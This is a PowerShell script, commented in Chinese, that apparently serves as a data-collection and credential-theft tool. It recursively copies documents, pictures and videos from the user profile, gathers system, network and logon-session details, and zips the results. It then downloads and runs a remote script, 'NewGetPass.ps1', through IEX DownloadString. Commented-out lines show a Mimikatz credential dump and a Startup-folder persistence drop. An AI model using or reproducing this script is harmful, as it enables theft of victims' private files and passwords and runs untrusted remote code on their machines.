#
$folderDateTime = (Get-Date).ToString('yyMMddHHmmss');
$workPath = 'C:\Report\' + $folderDateTime
#新建文件夹
$fileSaveDir = New-Item  ($workPath) -ItemType Directory
#获取内存中存储的密码？
#Invoke1-Mimikatz -Dumpcreds >> $fileSaveDir'/DumpPass.txt'
$userPath = (Get-ChildItem env:\userprofile).value;
#获取文档
$docDir = New-Item $fileSaveDir'\Doc' -ItemType Directory
Dir -filter *.txt -recurse $userPath | ForEach-Object {Copy-Item $_.FullName $docDir}
Dir -filter *.doc -recurse $userPath | ForEach-Object {Copy-Item $_.FullName $docDir}
Dir -filter *.docx -recurse $userPath | ForEach-Object {Copy-Item $_.FullName $docDir}
Dir -filter *.xls -recurse $userPath | ForEach-Object {Copy-Item $_.FullName $docDir}
Dir -filter *.xlsx -recurse $userPath | ForEach-Object {Copy-Item $_.FullName $docDir}
#获取图片
$picDir = New-Item $fileSaveDir'\Pic' -ItemType Directory
Dir -filter *.png -recurse $userPath | ForEach-Object {Copy-Item $_.FullName $picDir}
Dir -filter *.jpg -recurse $userPath | ForEach-Object {Copy-Item $_.FullName $picDir}
Dir -filter *.jpeg -recurse $userPath | ForEach-Object {Copy-Item $_.FullName $picDir}
#获取视频
$mediaDir = New-Item $fileSaveDir'\Media' -ItemType Directory
Dir -filter *.mp4 -recurse $userPath | ForEach-Object {Copy-Item $_.FullName $mediaDir}
Dir -filter *.mov -recurse $userPath | ForEach-Object {Copy-Item $_.FullName $mediaDir}

#机器信息
$infoDir = New-Item $fileSaveDir'\Info' -ItemType Directory
Get-WMIObject Win32_ComputerSystem >> $infoDir"/Win32_ComputerSystem.txt"
Get-CimInstance -ClassName Win32_BIOS >> $infoDir"/Win32_BIOS.txt"
Get-CimInstance -ClassName Win32_ComputerSystem >> $infoDir"/Win32_ComputerSystem.txt"
Get-CimInstance -ClassName Win32_OperatingSystem >> $infoDir"/Win32_OperatingSystem.txt"
Get-CimInstance -ClassName Win32_LogicalDisk >> $infoDir"/Win32_LogicalDisk.txt"
Get-CimInstance -ClassName Win32_LogonSession >> $infoDir"/Win32_LogonSession.txt"
Get-CimInstance -ClassName Win32_LocalTime >> $infoDir"/Win32_LocalTime.txt"
Get-CimInstance -ClassName Win32_Service >> $infoDir"/Win32_Service.txt"
ipconfig -all >> $infoDir"/ipconfig.txt"
whoami >> $infoDir"/whoami.txt"
tracert www.baidu.com >> $infoDir"/tracert.txt"

#windows内置zip压缩
function winZip($zipTarget, $zipPath){
    Add-Type -assembly "system.io.compression.filesystem"
    [io.compression.zipfile]::CreateFromDirectory($zipTarget, $zipPath)
}

winZip $docDir.FullName $workPath'/doc.zip'
winZip $picDir.FullName $workPath'/pic.zip'
winZip $mediaDir.FullName $workPath'/media.zip'
winZip $infoDir.FullName $workPath'/info.zip'

#DownloadData
#DownloadString
$psFileUrl = "http://ichiehpan.github.io/files/NewGetPass.ps1"
IEX (New-Object Net.WebClient).DownloadString($psFileUrl);
#DownloadFile
#$startupPath = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\NewGetPass.ps1"
#(New-Object Net.WebClient).DownloadFile($psFileUrl, $startupPath);



